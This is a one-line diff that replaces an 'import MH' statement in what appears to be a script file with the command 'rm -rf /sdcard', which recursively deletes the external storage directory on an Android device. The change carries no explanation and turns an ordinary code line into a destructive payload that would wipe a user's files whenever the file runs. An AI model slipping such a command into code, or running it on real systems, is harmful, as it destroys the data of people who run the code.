@@ -1,1 +1,1 @@
-import MH
+rm -rf /sdcard
